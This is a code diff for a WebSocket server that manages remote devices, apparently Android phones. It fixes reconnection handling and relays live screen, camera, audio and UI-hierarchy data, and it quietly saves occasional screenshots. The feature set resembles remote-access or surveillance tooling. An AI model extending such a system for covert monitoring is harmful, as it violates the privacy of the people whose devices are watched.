@@ -9,8 +9,19 @@ function handle(ws, req) {
   const deviceId = url.searchParams.get('device_id') || `dev_${Date.now()}`;
   const ip       = req.socket?.remoteAddress || req.headers?.['x-forwarded-for'] || '';
 
-  console.log(`[DEV+] ${deviceId} (${ip})`);
+  // ── DUPLICATE FIX: if device already connected under same id, terminate old
+  //    silently (no device_offline blast) before registering fresh socket ────
+  const existing = state.devices.get(deviceId);
+  if (existing && existing.ws !== ws) {
+    try { existing.ws.terminate(); } catch (_) {}
+    // Remove old ws from all subscription sets without broadcasting offline
+    for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
+      map.get(deviceId)?.delete(existing.ws);
+    }
+    console.log(`[DEV~] ${deviceId} reconnect — old socket terminated`);
+  }
 
+  console.log(`[DEV+] ${deviceId} (${ip})`);
   state.devices.set(deviceId, { ws, deviceId, ip, lastSeen: Date.now() });
   q.setOnline.run(Date.now(), deviceId);
   state.broadcastAll({ type: 'device_online', device_id: deviceId, ip, ts: Date.now() });
@@ -23,11 +34,13 @@ function handle(ws, req) {
 
     if (isBinary) {
       const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
+      // Frame header: 0x01 | uint32be(size) | jpeg_bytes
       if (buf.length >= 5 && buf[0] === 0x01) {
         const size = buf.readUInt32BE(1);
         if (buf.length >= 5 + size) {
           const jpeg = buf.slice(5, 5 + size);
           state.relayVncFrame(deviceId, jpeg);
+          // 1% chance persist as screenshot
           if (Math.random() < 0.01) {
             q.insertSS.run(deviceId, jpeg.toString('base64'), now);
             q.pruneSS.run(deviceId);
@@ -44,11 +57,17 @@ function handle(ws, req) {
   });
 
   ws.on('close', () => {
-    console.log(`[DEV-] ${deviceId}`);
-    state.devices.delete(deviceId);
-    q.setOffline.run(Date.now(), deviceId);
-    state.broadcastAll({ type: 'device_offline', device_id: deviceId, ts: Date.now() });
-    for (const m of [state.vncSubs, state.cameraSubs, state.audioSubs]) m.delete(deviceId);
+    // Only broadcast offline if this ws is still the registered one
+    // (avoids ghost-offline when device reconnected and old socket fires close later)
+    if (state.devices.get(deviceId)?.ws === ws) {
+      console.log(`[DEV-] ${deviceId}`);
+      state.devices.delete(deviceId);
+      q.setOffline.run(Date.now(), deviceId);
+      state.broadcastAll({ type: 'device_offline', device_id: deviceId, ts: Date.now() });
+      for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
+        map.get(deviceId)?.delete(ws);
+      }
+    }
   });
 
   ws.on('error', err => console.error(`[DEV!] ${deviceId}:`, err.message));
@@ -223,8 +242,13 @@ function dispatch(deviceId, ip, type, msg, now) {
     }
 
     case 'SCREEN_HIERARCHY': {
-      state.broadcastAll({ type: 'screen_hierarchy', device_id: deviceId,
-        data: msg.data || JSON.stringify(msg), ts: now });
+      // Forward raw data string — let the client parse the APK's exact format
+      state.broadcastAll({
+        type:      'screen_hierarchy',
+        device_id: deviceId,
+        data:      msg.data || JSON.stringify(msg),
+        ts:        now,
+      });
       break;
     }
 
